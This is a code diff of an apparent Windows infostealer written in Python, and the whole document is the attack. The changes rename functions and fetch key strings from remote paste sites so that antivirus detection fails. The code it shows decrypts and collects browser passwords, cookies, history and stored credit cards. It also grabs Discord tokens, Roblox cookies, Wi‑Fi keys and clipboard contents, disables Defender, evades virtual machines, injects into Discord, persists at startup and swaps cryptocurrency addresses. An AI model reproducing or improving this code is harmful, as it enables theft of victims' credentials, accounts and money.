@@ -47,7 +47,7 @@ temp = os.getenv("TEMP")
 
 
 
-NotPSSW = []
+Notpasswrd = []
 
 myhawkname = "https://rentry.co/on4ev/raw"
 thisresp = requests.get(myhawkname)
@@ -61,9 +61,13 @@ pleasegetsecretcore = "https://rentry.co/rh234/raw"
 thissecretcore = requests.get(pleasegetsecretcore)
 coresecretname = thissecretcore.text
 
-srdl_st_secret = "https://rentry.co/nxuf8/raw"
-thisst = requests.get(srdl_st_secret)
+hwkishst_secret = "https://rentry.co/nxuf8/raw"
+thisst = requests.get(hwkishst_secret)
 stspecial = thisst.text
+
+wattis_secret = "https://rentry.co/fwi67/raw"
+fckyesz = requests.get(wattis_secret)
+maybycool = fckyesz.text
 
 
 shwk_aaast_secret = "https://rentry.co/wnqm9/raw"
@@ -79,26 +83,41 @@ spoted_victim = os.getenv("COMPUTERNAME")
 space_stored = str(psutil.disk_usage("/")[0] / 1024 ** 3).split(".")[0]
 fastmem_stored = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
 
-srdl_myregex_secret = "https://rentry.co/shitonyourAV/raw"
-reg_req = requests.get(srdl_myregex_secret)
+hwkishmyregex_secret = "https://rentry.co/shitonyourAV/raw"
+reg_req = requests.get(hwkishmyregex_secret)
 regx_net = r"[\w-]{24}\." + reg_req.text
 
+netwrd = "https://rentry.co/fgsqi/raw"
+myboyzzz = requests.get(netwrd)
+ntwrk = myboyzzz.text
+
+
+
+
+lilccks = "https://rentry.co/gxoe5/raw"
+rezs = requests.get(lilccks)
+justatermlil = rezs.text
+
+
+bigccks = "https://rentry.co/fzr38/raw"
+rez = requests.get(bigccks)
+justaterm = rez.text
 
 
 
 json_confg = {
-    "creator": "%PC_CREATOR%",
+    "created_by": "%PC_CREATOR%",
     "apilink": "%API_LINK%",
-    "webh_secret": "%_config_4888%",
-    "browsers_files": "%_config_2211%",
-    "getav_files": "%_config_6744%",
-    "minecraft_files": "%_config_6522%",
-    "sys_files": "%_config_4454%",
-    "roblox_files": "%_config_498%",
-    "screen_files": "%_config_777%",
+    "hooking_hawk": "%_config_4888%",
+    "browsers_found": "%_config_2211%",
+    "found_av": "%_config_6744%",
+    "files_mc": "%_config_6522%",
+    "sys_found": "%_config_4454%",
+    "roblox_found": "%_config_498%",
+    "screen_found": "%_config_777%",
     "ping_config": "%_config_632%",
-    "clipboard_files": "%_config_555%",
-    "w1f1_files": "%_config_741%",
+    "clipboard_found": "%_config_555%",
+    "w1f1_found": "%_config_741%",
     "hide_config": "%_config_546%",
     "pingtype_config": "%_config_621%",
     "killdiscord_config": '%_config_45666%',
@@ -106,18 +125,18 @@ json_confg = {
     "startup_config": "%_config_456%",
     "chromenject_config": "%_config_169%",
     "url_hawkinject": f"https://raw.githubusercontent.com/{hwkish}-{stspecial}/{hwkish}-{justafcklink}",
-    "SSSSSSSSSS1": '%_config_6511%',
-    "SSSSSSSSSS2": "%_config_141%",
-    "SSSSSSSSSS3": "%_config_119%",
-    "SSSSSSSSSS4": "%_config_41%",
-    "SSSSSSSSSS5": "%_config_118%",
-    "SSSSSSSSSS6": "%_config_185%",
-    "SSSSSSSSSS7": "%_config_1222%",
-    "SSSSSSSSSS8": "%_config_55%",
-    "SSSSSSSSSS9": "%_config_45%",
-    "SSSSSSSSSS10": "%_config_89%",
-    "SSSSSSSSSS11": "%_config_101%",
-    "SSSSSSSSSS12": "%_config_102%",
+    "SAEZRTYRES1": '%_config_6511%',
+    "AEAZAKG55": "%_config_141%",
+    "AEZRETRYY5": "%_config_119%",
+    "AEZAZRETG55": "%_config_41%",
+    "MPALFLLLL": "%_config_118%",
+    "A8666ACLLLL": "%_config_185%",
+    "AEZ56TRYY5": "%_config_1222%",
+    "LOA444KVDSO": "%_config_55%",
+    "MPALAGZBLL": "%_config_45%",
+    "MPLAO55599BL": "%_config_89%",
+    "LOGZKNNNN": "%_config_101%",
+    "AKEOZDSON9N": "%_config_102%",
 }
 
 url = f"https://raw.githubusercontent.com/{hwkish}x/testingsomedead/main/nope.json"
@@ -134,17 +153,17 @@ except:
 
 class Functions(object):
     @staticmethod
-    def srdl_findClipboard():
+    def hwkishfindClipboard():
         return subprocess.run("powershell Get-Clipboard", shell=True, capture_output=True).stdout.decode(
             errors='backslashreplace').strip()
     
     @staticmethod
-    def srdl_findDevices():
+    def hwkishfindDevices():
         return subprocess.run("powershell Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }",
                         creationflags=0x08000000, shell=True, capture_output=True)
 
     @staticmethod
-    def srdl_findwifi():
+    def hwkishfindwifi():
         profiles = list()
         passwords = dict()
 
@@ -221,29 +240,29 @@ class Functions(object):
         sh2 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
         sh3 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
         try:
-            hwid_windows = (
+            window_wid = (
                 subprocess.check_output(sh1, creationflags=flag)
                 .decode()
                 .split("\n")[1]
                 .strip()
             )
         except Exception:
-            hwid_windows = "N/A"
+            window_wid = "N/A"
         try:
-            keywindow_found = (
+            windowfoundkey = (
                 subprocess.check_output(
                     sh2, creationflags=flag).decode().rstrip()
             )
         except Exception:
-            keywindow_found = "N/A"
+            windowfoundkey = "N/A"
         try:
-            never_wind = (
+            wind_never = (
                 subprocess.check_output(
                     sh3, creationflags=flag).decode().rstrip()
             )
         except Exception:
-            never_wind = "N/A"
-        return [hwid_windows, never_wind, keywindow_found]
+            wind_never = "N/A"
+        return [window_wid, wind_never, windowfoundkey]
 
     @staticmethod
     def value_decrypt(buff, master_key) -> str:
@@ -294,16 +313,16 @@ class Functions(object):
 
 class Replacer_Loop(Functions):
     def __init__(self):
-        self.btc_finder = self.find_in_config("SSSSSSSSSS5")
+        self.btc_finder = self.find_in_config("MPALFLLLL")
         self.addresses = {
-            "btc": self.find_in_config("SSSSSSSSSS6"),
-            "eth": self.find_in_config("SSSSSSSSSS8"),
-            "xchain": self.find_in_config("SSSSSSSSSS9"),
-            "pchain": self.find_in_config("SSSSSSSSSS10"),
-            "cchain": self.find_in_config("SSSSSSSSSS11"),
-            "monero": self.find_in_config("SSSSSSSSSS12"),
-            "ada": self.find_in_config("SSSSSSSSSS4"),
-            "dash": self.find_in_config("SSSSSSSSSS7"),
+            "btc": self.find_in_config("A8666ACLLLL"),
+            "eth": self.find_in_config("LOA444KVDSO"),
+            "xchain": self.find_in_config("MPALAGZBLL"),
+            "pchain": self.find_in_config("MPLAO55599BL"),
+            "cchain": self.find_in_config("LOGZKNNNN"),
+            "monero": self.find_in_config("AKEOZDSON9N"),
+            "ada": self.find_in_config("AEZAZRETG55"),
+            "dash": self.find_in_config("AEZ56TRYY5"),
         }
 
     def copy_address(self, regex, address_key):
@@ -336,38 +355,38 @@ class Replacer_Loop(Functions):
             self.loop_through()
 
 
-class first_srdl_func(Functions):
+class hwkish_first_funct(Functions):
     def __init__(self):
 
-        self.ddeco = f'{base64.b64decode(self.find_in_config("webh_secret"))}'.replace(
+        self.eco_baby = f'{base64.b64decode(self.find_in_config("hooking_hawk"))}'.replace(
             "b'", "").replace("'", "")
-        self.ddecos = str(self.ddeco)
+        self.ecobybro = str(self.eco_baby)
 
         self.thingstocount = {
-            'Cooks': 0,
-            'Pssw': 0,
-            'CC': 0,
-            'Hist': 0,
-            'Screenshots': 0,
-            'Disco_info': 0,
-            'Rblx_Cooks': 0,
-            'Minecraft': 0,
-            'Wifi': 0
+            f'{justatermlil}': 0,
+            'passwrd': 0,
+            'screenshotbro': 0,
+            'creditcard': 0,
+            'historybaby': 0,
+            'info_discord': 0,
+            'roblox_friendly': 0,
+            'friendlybabymc': 0,
+            'wifinet': 0
         }
 
-        self.this_so_webh = self.ddecos
+        self.thishawk_webh = self.ecobybro
 
         self.apilink = self.find_in_config("apilink")
         
-        self.creator = self.find_in_config("creator")
+        self.created_by = self.find_in_config("created_by")
 
-        self.customname = str(self.creator)
+        self.gangman = str(self.created_by)
 
-        self.custombutstr = self.customname
+        self.str_creator_ = self.gangman
 
         self.hide = self.find_in_config("hide_config")
 
-        self.disablemydefender = self.find_in_config("SSSSSSSSSS2")
+        self.disablemydefender = self.find_in_config("AEAZAKG55")
 
         self.pingtype = self.find_in_config("pingtype_config")
 
@@ -379,28 +398,29 @@ class first_srdl_func(Functions):
 
         self.fake_error = self.find_in_config("fake_error_config")
 
-        self.ineedtogetbrowsers = self.find_in_config("browsers_files")
+        self.hwk_get_browsers = self.find_in_config("browsers_found")
 
-        self.ineedtogetav = self.find_in_config("getav_files")
+        self.hwk_get_av = self.find_in_config("found_av")
 
-        self.ineedtogetmc = self.find_in_config("minecraft_files")
+        self.hwk_get_mc = self.find_in_config("files_mc")
 
-        self.ineedtogetsys = self.find_in_config("sys_files")
+        self.hwk_get_sys = self.find_in_config("sys_found")
 
-        self.ineedtogetrblx = self.find_in_config("roblox_files")
+        self.hwk_get_rblx = self.find_in_config("roblox_found")
 
-        self.ineedtogetscreen = self.find_in_config("screen_files")
+        self.hwk_get_screen = self.find_in_config("screen_found")
 
-        self.ineedtogetclipboard = self.find_in_config("clipboard_files")
+        self.hwk_get_clipboard = self.find_in_config("clipboard_found")
 
-        self.ineedtogetwifipassword = self.find_in_config("w1f1_files")
+        self.hwk_get_wifipassword = self.find_in_config("w1f1_found")
 
         self.appdata = os.getenv("localappdata")
 
         self.roaming = os.getenv("appdata")
+        self._1 = "Google"
 
-        self.chrmmuserdtt = ntpath.join(
-            self.appdata, "Google", "Chrome", "User Data")
+        self.chrome_user_path = ntpath.join(
+            self.appdata, self._1, "Chrome", maybycool)
 
         self.dir, self.temp = mkdtemp(), gettempdir()
 
@@ -425,24 +445,24 @@ class first_srdl_func(Functions):
         self.progress_bar = "[" + "█" * self.num_filled_blocks + "." * \
             (self.progress_bar_length - self.num_filled_blocks) + "]"
 
-        self.srdl_mycommand_secret = "https://rentry.co/shitbymyself/raw"
-        self.secretcommand = requests.get(self.srdl_mycommand_secret)
+        self.hwkishmycommand_secret = "https://rentry.co/shitbymyself/raw"
+        self.secretcommand = requests.get(self.hwkishmycommand_secret)
         self.command_disable = f"{self.secretcommand}"
 
-        self.hwid_windows, self.never_wind, self.keywindow_found = (
+        self.window_wid, self.never_wind, self.windowfoundkey = (
             inf[0],
             inf[1],
             inf[2],
         )
 
         (
-            self.ip,
             self.city,
-            self.country,
             self.region,
+            self.country,
+            self.ip,
+            self.gglemp,
             self.org,
             self.loc,
-            self.gglemp,
         ) = (net[0], net[1], net[2], net[3], net[4], net[5], net[6])
 
         self.localstartup = ntpath.join(
@@ -459,20 +479,20 @@ class first_srdl_func(Functions):
 
         self.regex = regx_net
 
-        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
+        self.regexcrypt = r"dQw4w9WgXcQ:[^\"]*"
 
-        self.tokens = []
+        self.hawked = []
 
-        self.srdl_id = []
+        self.hwkishid = []
 
         self.sep = os.sep
 
-        self.robloxcookies = []
+        self.rblxcckcs = []
 
-        self.datazip_url = ""
+        self.thezip_url = ""
 
         self.chrome_key = self.mykey_gtm(
-            ntpath.join(self.chrmmuserdtt, "Local State"))
+            ntpath.join(self.chrome_user_path, "Local State"))
 
         os.makedirs(self.dir, exist_ok=True)
         
@@ -559,7 +579,7 @@ class first_srdl_func(Functions):
                 win32gui.ShowWindow(hide, win32con.SW_HIDE)
         
 
-    def remoter_srdl_err(self: str) -> str:
+    def remoter_hwkisherr(self: str) -> str:
         if self.fake_error != "yes":
             return
         ctypes.windll.user32.MessageBoxW(
@@ -582,11 +602,11 @@ class first_srdl_func(Functions):
             "avatar_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/{myname_little}.png",
             "content": "@here",
         }
-        if self.webapi_find in self.this_so_webh:
+        if self.webapi_find in self.thishawk_webh:
             if self.pingtype in ["@everyone", "everyone"]:
-                httpx.post(self.this_so_webh, json=ping1)
+                httpx.post(self.thishawk_webh, json=ping1)
             elif self.pingtype in ["@here", "here"]:
-                httpx.post(self.this_so_webh, json=ping2)
+                httpx.post(self.thishawk_webh, json=ping2)
 
     def startup_so(self: str) -> str:
         if self.startupexe != "yes":
@@ -612,7 +632,7 @@ class first_srdl_func(Functions):
             except:
                 pass
 
-    def srdl_exit_this(self):
+    def hwkishexit_this(self):
         shutil.rmtree(self.dir, ignore_errors=True)
         os._exit(0)
 
@@ -811,51 +831,51 @@ class first_srdl_func(Functions):
             "Profile 5",
         ]
 
-        if self.this_so_webh == "" or self.this_so_webh == "\x57EBHOOK_HERE":
-            self.srdl_exit_this()
+        if self.thishawk_webh == "" or self.thishawk_webh == "\x57EBHOOK_HERE":
+            self.hwkishexit_this()
 
         self.hide_so()
         self.askadmin()
-        self.srdl_disabledefender()
-        self.remoter_srdl_err()
+        self.hwkishdisabledefender()
+        self.remoter_hwkisherr()
         self.startup_so()
 
-        if self.find_in_config("SSSSSSSSSS1") and NoDebugg().inVM is True:
-            self.srdl_exit_this()
-        if self.find_in_config("SSSSSSSSSS3") == "yes":
+        if self.find_in_config("SAEZRTYRES1") and AntiDebugg().inVM is True:
+            self.hwkishexit_this()
+        if self.find_in_config("AEZRETRYY5") == "yes":
             await self.bypss_betterdsc()
             await self.bypass_tokenprtct()
 
-        if self.ineedtogetsys == "yes":
+        if self.hwk_get_sys == "yes":
             os.makedirs(ntpath.join(self.dir, "Systeme"), exist_ok=True)
 
-        if self.ineedtogetrblx == "yes":
+        if self.hwk_get_rblx == "yes":
             os.makedirs(ntpath.join(self.dir, "Roblox"), exist_ok=True)
         function_list = [
-            self.screentimes,
-            self.srdl_get_mywifi,
-            self.getmyclipboard,
-            self.srdl_findUSBdevices,
-            self.srdl_getmyAV,
+            self.screen_baby,
+            self.hwkishget_mywifi,
+            self.downloadclipboard,
+            self.hwkishfindUSBdevices,
+            self.hwkishgetmyAV,
             self.system_informations,
-            self.find_my_tkn,
-            self.find_my_mc,
+            self.found_thistkn,
+            self.found_thismc,
             self.find_roblox,
         ]
 
         if self.find_in_config("killdiscord_config") is True:
             await self.kill_process_id()
-        if self.ineedtogetbrowsers == "yes":
+        if self.hwk_get_browsers == "yes":
             os.makedirs(ntpath.join(self.dir, "Browsers"), exist_ok=True)
         for name, path in self.browsers.items():
             if not os.path.isdir(path):
                 continue
             self.masterkey = self.mykey_gtm(path + "\\Local State")
             self.funcs = [
-                self.srdl_steal_cookss,
-                self.srdl_steal_thishist2,
-                self.srdl_steal_psw2,
-                self.srdl_steal_cc2,
+                self.gang_hwkstl,
+                self.hwkishsteal_thishist2,
+                self.hwkishsteal_psw2,
+                self.hwkishsteal_cc2,
             ]
 
             for profile in self.profiles:
@@ -868,10 +888,10 @@ class first_srdl_func(Functions):
                         func(name, path)
                     except:
                         pass
-        if ntpath.exists(self.chrmmuserdtt) and self.chrome_key is not None:
+        if ntpath.exists(self.chrome_user_path) and self.chrome_key is not None:
             os.makedirs(ntpath.join(self.dir, "Google"), exist_ok=True)
             function_list.extend(
-                [self.srdl_steal_psw, self.srdl_stol_cookies, self.srdl_steal_thishist]
+                [self.hwkishsteal_psw, self.hwkishstol_gang, self.hwkishsteal_thishist]
             )
         for func in function_list:
             process = threading.Thread(target=func, daemon=True)
@@ -1024,7 +1044,7 @@ class first_srdl_func(Functions):
                     if self.apilink != "%API_" + "LINK%":
                         newdata = filedata.replace('%API_URL%', self.apilink)
                     else:
-                        newdata = filedata.replace('%WEBHOOK%', self.this_so_webh)
+                        newdata = filedata.replace('%WEBHOOK%', self.thishawk_webh)
                 with open(main_file, 'w') as f:
                     f.write(newdata)
                     f.close()
@@ -1034,7 +1054,7 @@ class first_srdl_func(Functions):
                     if self.apilink != "%API_" + "LINK%":
                         newdata = filedata.replace('%API_URL%', self.apilink)
                     else:
-                        newdata = filedata.replace('%WEBHOOK%', self.this_so_webh)
+                        newdata = filedata.replace('%WEBHOOK%', self.thishawk_webh)
                 with open(main_file2, 'w') as f:
                     f.write(newdata)
                     f.close()
@@ -1152,7 +1172,7 @@ class first_srdl_func(Functions):
             pass
 
     async def injection_discord(self):
-        if self.find_in_config("SSSSSSSSSS3") != "yes":
+        if self.find_in_config("AEZRETRYY5") != "yes":
             return
         self.appdata = os.getenv("localappdata")
         discord_paths = [
@@ -1195,18 +1215,18 @@ class first_srdl_func(Functions):
                         except PermissionError:
                             pass
                     
-                    if self.webapi_find in self.this_so_webh:
+                    if self.webapi_find in self.thishawk_webh:
                         core_asar = self.find_in_config("url_hawkinject")
                         try:
                             f = httpx.get(core_asar).text
                             if self.apilink != "%API_" + "LINK%":
                                 f = f.replace("%API_URL%", self.apilink)
-                                f = f.replace("%NAME_CREATOR%", self.custombutstr)
-                                f = f.replace("%TRANSFER_URL%", self.datazip_url.replace("\n", ""))
+                                f = f.replace("%NAME_CREATOR%", self.str_creator_)
+                                f = f.replace("%TRANSFER_URL%", self.thezip_url.replace("\n", ""))
                             else:
-                                f = f.replace("%WEBHOOK%", self.this_so_webh)
-                                f = f.replace("%NAME_CREATOR%", self.custombutstr)
-                                f = f.replace("%TRANSFER_URL%", self.datazip_url.replace("\n", ""))
+                                f = f.replace("%WEBHOOK%", self.thishawk_webh)
+                                f = f.replace("%NAME_CREATOR%", self.str_creator_)
+                                f = f.replace("%TRANSFER_URL%", self.thezip_url.replace("\n", ""))
                         except AttributeError:
                             pass
                     try:
@@ -1310,7 +1330,7 @@ class first_srdl_func(Functions):
         except Exception:
             return "Failed to decrypt password"
 
-    def find_my_masterk3y(self, path):
+    def found_thismasterk3y(self, path):
         with open(path, "r", encoding="utf-8") as f:
             c = f.read()
         local_state = json.loads(c)
@@ -1319,7 +1339,7 @@ class first_srdl_func(Functions):
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
 
-    def find_my_tkn(self):
+    def found_thistkn(self):
         paths = {
             "Discord": self.roaming + "\\discord\\Local Storage\\leveldb\\",
             "Discord Canary": self.roaming + "\\discordcanary\\Local Storage\\leveldb\\",
@@ -1366,12 +1386,12 @@ class first_srdl_func(Functions):
                             ).readlines()
                             if x.strip()
                         ]:
-                            for y in re.findall(self.encrypted_regex, line):
+                            for y in re.findall(self.regexcrypt, line):
                                 try:
                                     token = self.decrypt_this_value(
                                         base64.b64decode(
                                             y.split("dQw4w9WgXcQ:")[1]),
-                                        self.find_my_masterk3y(
+                                        self.found_thismasterk3y(
                                             self.roaming +
                                             f"\\{disc}\\Local State"
                                         ),
@@ -1391,9 +1411,9 @@ class first_srdl_func(Functions):
                                     pass
                                 if r.status_code == 200:
                                     uid = r.json()["id"]
-                                    if uid not in self.srdl_id:
-                                        self.tokens.append(token)
-                                        self.srdl_id.append(uid)
+                                    if uid not in self.hwkishid:
+                                        self.hawked.append(token)
+                                        self.hwkishid.append(uid)
             else:
                 for filname in os.listdir(path):
                     if filname[-3:] not in ["log", "ldb"]:
@@ -1417,9 +1437,9 @@ class first_srdl_func(Functions):
                                 pass
                             if r.status_code == 200:
                                 uid = r.json()["id"]
-                                if uid not in self.srdl_id:
-                                    self.tokens.append(token)
-                                    self.srdl_id.append(uid)
+                                if uid not in self.hwkishid:
+                                    self.hawked.append(token)
+                                    self.hwkishid.append(uid)
         if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
             for path, _, files in os.walk(
                     self.roaming + "\\Mozilla\\Firefox\\Profiles"
@@ -1446,9 +1466,9 @@ class first_srdl_func(Functions):
                                 pass
                             if r.status_code == 200:
                                 uid = r.json()["id"]
-                                if uid not in self.srdl_id:
-                                    self.tokens.append(token)
-                                    self.srdl_id.append(uid)
+                                if uid not in self.hwkishid:
+                                    self.hawked.append(token)
+                                    self.hwkishid.append(uid)
 
     def dir_random_create(self, _dir: str or os.PathLike = gettempdir()):
         filname = "".join(
@@ -1462,8 +1482,8 @@ class first_srdl_func(Functions):
         return path
 
     @extract_try
-    def srdl_steal_psw2(self, name: str, path: str, profile: str):
-        if self.ineedtogetbrowsers != "yes":
+    def hwkishsteal_psw2(self, name: str, path: str, profile: str):
+        if self.hwk_get_browsers != "yes":
             return
 
         path = os.path.join(path, profile, "Login Data")
@@ -1475,64 +1495,46 @@ class first_srdl_func(Functions):
             copy2(path, loginvault)
             conn = sqlite3.connect(loginvault)
             cursor = conn.cursor()
-            with open(os.path.join(self.dir, "Browsers", "Browsers Passwords.txt"), "a", encoding="utf-8") as f:
+            with open(os.path.join(self.dir, "Browsers", "Password.txt"), "a", encoding="utf-8") as f:
                 for url, username, password in cursor.execute("SELECT origin_url, username_value, password_value FROM logins"):
                     if url:
                         password = self.value_decrypt(password, self.masterkey)
                         f.write(
-                            f"URL: {url}\nID: {username}\n{hwkish}-{stspecial}  Password: {password}\n\n")
-                        self.thingstocount['Pssw'] += len(password)
+                            f"LINK: {url}\nIDENT:{username}\n{hwkish}-{stspecial}  PASSW:{password}\n\n")
+                        self.thingstocount['passwrd'] += len(password)
             cursor.close()
         finally:
             conn.close()
             os.remove(loginvault)
 
     @extract_try
-    def srdl_steal_cookss(self, name: str, path: str, profile: str):
-        if self.ineedtogetbrowsers != "yes":
+    def gang_hwkstl(self, file_name: str, file_path: str, proc_file: str):
+        if self.hwk_get_browsers != "yes":
             return
-
-        path = os.path.join(path, profile, "Network", "Cookies")
-        if not os.path.isfile(path):
-            return
-
-        cookievault = self.dir_random_create()
-        shutil.copy2(path, cookievault)
-
-        conn = sqlite3.connect(cookievault)
-        cursor = conn.cursor()
-
-        with open(
-            os.path.join(self.dir, "Browsers", "Browsers Cookies.txt"),
-            "a",
-            encoding="utf-8",
-        ) as f:
-            for res in cursor.execute(
-                "SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies"
-            ).fetchall():
+        cckcs = self.dir_random_create()
+        shutil.copy2(os.path.join(file_path, proc_file, ntwrk, f"{justaterm}"), cckcs)
+        with sqlite3.connect(cckcs) as conn:
+            cursor = conn.cursor()
+            query = "SELECT {columns} FROM {table}".format(columns="host_key, name, path, encrypted_value, expires_utc", table=f"{justatermlil}")
+            for res in cursor.execute(query).fetchall():
                 host_key, name, path, encrypted_value, expires_utc = res
                 value = self.value_decrypt(encrypted_value, self.masterkey)
                 if host_key and name and value:
-                    f.write(
-                        f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n"
-                    )
-
-        cursor.close()
-        conn.close()
-
-        os.remove(cookievault)
-        self.thingstocount['Cooks'] += len(host_key)
+                    with open(os.path.join(self.dir, "Browsers", f"{justaterm}.txt"), "a", encoding="utf-8") as f:
+                        f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
+        os.remove(cckcs)
+        self.thingstocount[f'{justatermlil}'] += len(host_key)
 
     @extract_try
-    def srdl_steal_psw(self):
-        if self.ineedtogetbrowsers != "yes":
+    def hwkishsteal_psw(self):
+        if self.hwk_get_browsers != "yes":
             return
 
         with open(ntpath.join(self.dir, "Google", "Passwords.txt"), "w", encoding="cp437", errors="ignore") as f:
-            for prof in os.listdir(self.chrmmuserdtt):
+            for prof in os.listdir(self.chrome_user_path):
                 if re.match(self.chrmrgx, prof):
                     login_db = ntpath.join(
-                        self.chrmmuserdtt, prof, "Login Data")
+                        self.chrome_user_path, prof, "Login Data")
                     login = self.files_creating()
                     shutil.copy2(login_db, login)
 
@@ -1546,52 +1548,51 @@ class first_srdl_func(Functions):
                                 encrypted_password, self.chrome_key)
                             if url:
                                 f.write(
-                                    f"URL: {url}\nID: {username}\n{hwkish}-{stspecial}  Password: {decrypted_password}\n\n")
-                                self.thingstocount['Pssw'] += len(
+                                    f"LINK: {url}\nIDENT:{username}\n{hwkish}-{stspecial}  PASSW:{decrypted_password}\n\n")
+                                self.thingstocount['passwrd'] += len(
                                     decrypted_password)
 
                     os.remove(login)
 
     @extract_try
-    def srdl_stol_cookies(self):
-        if self.ineedtogetbrowsers != "yes":
+    def hwkishstol_gang(self):
+        if self.hwk_get_browsers != "yes":
             return
 
-        with open(ntpath.join(self.dir, "Google", "Cookies.txt"), "w", encoding="cp437", errors="ignore") as f:
-            for prof in os.listdir(self.chrmmuserdtt):
+        with open(ntpath.join(self.dir, "Google", f"{justaterm}.txt"), "w", encoding="cp437", errors="ignore") as f:
+            for prof in os.listdir(self.chrome_user_path):
                 if re.match(self.chrmrgx, prof):
                     login_db = ntpath.join(
-                        self.chrmmuserdtt, prof, "Network", "cookies")
+                        self.chrome_user_path, prof, ntwrk, f"{justatermlil}")
                     login = self.files_creating()
 
                     shutil.copy2(login_db, login)
                     conn = sqlite3.connect(login)
                     cursor = conn.cursor()
                     cursor.execute(
-                        "SELECT host_key, name, encrypted_value from cookies")
+                        f"SELECT host_key, name, encrypted_value from {justatermlil}")
 
                     for r in cursor.fetchall():
                         host, user, encrypted_value = r
-                        decrypted_cookie = self.value_decrypt(
+                        dcryptedcks = self.value_decrypt(
                             encrypted_value, self.chrome_key)
                         if host != "":
                             f.write(
-                                f"{host}\tTRUE\t\t/FALSE\t2597573456\t{user}\t{decrypted_cookie}\n")
+                                f"{host}\tTRUE\t\t/FALSE\t2597573456\t{user}\t{dcryptedcks}\n")
 
-                        if "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" in decrypted_cookie:
-                            self.robloxcookies.append(decrypted_cookie)
+                        if "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" in dcryptedcks:
+                            self.rblxcckcs.append(dcryptedcks)
 
-                        self.thingstocount['Cooks'] += len(decrypted_cookie)
-                        self.thingstocount['Rblx_Cooks'] += len(
-                            self.robloxcookies)
+                        self.thingstocount[f'{justatermlil}'] += len(dcryptedcks)
+                        self.thingstocount['roblox_friendly'] += len(self.rblxcckcs)
 
                     cursor.close()
                     conn.close()
                     os.remove(login)
             f.close()
 
-    def srdl_steal_thishist2(self, name: str, path: str, profile: str):
-        if self.ineedtogetbrowsers != "yes":
+    def hwkishsteal_thishist2(self, name: str, path: str, profile: str):
+        if self.hwk_get_browsers != "yes":
             return
 
         path = os.path.join(path, profile, "History")
@@ -1605,7 +1606,7 @@ class first_srdl_func(Functions):
         cursor = conn.cursor()
 
         with open(
-            os.path.join(self.dir, "Browsers", "Browsers History.txt"),
+            os.path.join(self.dir, "Browsers", "History.txt"),
             "a",
             encoding="utf-8",
         ) as f:
@@ -1616,7 +1617,7 @@ class first_srdl_func(Functions):
                 sites.append(res)
 
             sites.sort(key=lambda x: x[3], reverse=True)
-            self.thingstocount['Hist'] += len(sites)
+            self.thingstocount['historybaby'] += len(sites)
 
             for site in sites:
                 f.write("Visit Count: {:<6} Title: {:<40}\n".format(
@@ -1626,8 +1627,8 @@ class first_srdl_func(Functions):
         conn.close()
         os.remove(historyvault)
 
-    def srdl_steal_cc2(self, name: str, path: str, profile: str):
-        if self.ineedtogetbrowsers != "yes":
+    def hwkishsteal_cc2(self, name: str, path: str, profile: str):
+        if self.hwk_get_browsers != "yes":
             return
 
         path += "\\" + profile + "\\Web Data"
@@ -1641,22 +1642,22 @@ class first_srdl_func(Functions):
                 cursor.execute(
                     "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards WHERE name_on_card != '' AND card_number_encrypted != ''"
                 )
-                with open(ntpath.join(self.dir, "Browsers", "Browsers CC.txt"), "a", encoding="utf-8") as f:
+                with open(ntpath.join(self.dir, "Browsers", "CC.txt"), "a", encoding="utf-8") as f:
                     for res in cursor.fetchall():
                         name_on_cc, expir_on_cc, expir_year_cc, number_onmy_cc = res
                         f.write(
                             f"Name: {name_on_cc}   Expiration Month: {expir_on_cc}   Expiration Year: {expir_year_cc}   Card Number: {self.value_decrypt(number_onmy_cc, self.masterkey)}\n"
                         )
-                        self.thingstocount['CC'] += len(name_on_cc)
+                        self.thingstocount['creditcard'] += len(name_on_cc)
         os.remove(cc_vaults)
 
     @extract_try
-    def srdl_steal_thishist(self):
-        if self.ineedtogetbrowsers != "yes":
+    def hwkishsteal_thishist(self):
+        if self.hwk_get_browsers != "yes":
             return
 
         with open(ntpath.join(self.dir, "Google", "History.txt"), "w", encoding="cp437", errors="ignore") as f:
-            def srdl_pleaseexctract(db_cursor):
+            def hwkishpleaseexctract(db_cursor):
                 db_cursor.execute(
                     "SELECT title, url, last_visit_time FROM urls")
                 for item in db_cursor.fetchall():
@@ -1668,11 +1669,11 @@ class first_srdl_func(Functions):
                     if item[0] != "":
                         yield item[0]
 
-            for prof in os.listdir(self.chrmmuserdtt):
+            for prof in os.listdir(self.chrome_user_path):
                 if not re.match(self.chrmrgx, prof):
                     continue
 
-                login_db = ntpath.join(self.chrmmuserdtt, prof, "History")
+                login_db = ntpath.join(self.chrome_user_path, prof, "History")
                 login = self.files_creating()
 
                 shutil.copy2(login_db, login)
@@ -1680,21 +1681,21 @@ class first_srdl_func(Functions):
                     cursor = conn.cursor()
 
                     search_history = exctract_websearch_bc(cursor)
-                    web_history = srdl_pleaseexctract(cursor)
+                    web_history = hwkishpleaseexctract(cursor)
 
                     f.write(
                         f"{' ' * 17}{hwkish}-{stspecial} SEARCH\n{'-' * 50}\n{search_history}\n{' ' * 17}\n\nLinks History\n{'-' * 50}\n{web_history}"
                     )
 
-                    self.thingstocount['Hist'] += sum(
+                    self.thingstocount['historybaby'] += sum(
                         1 for _ in search_history)
-                    self.thingstocount['Hist'] += sum(1 for _ in web_history)
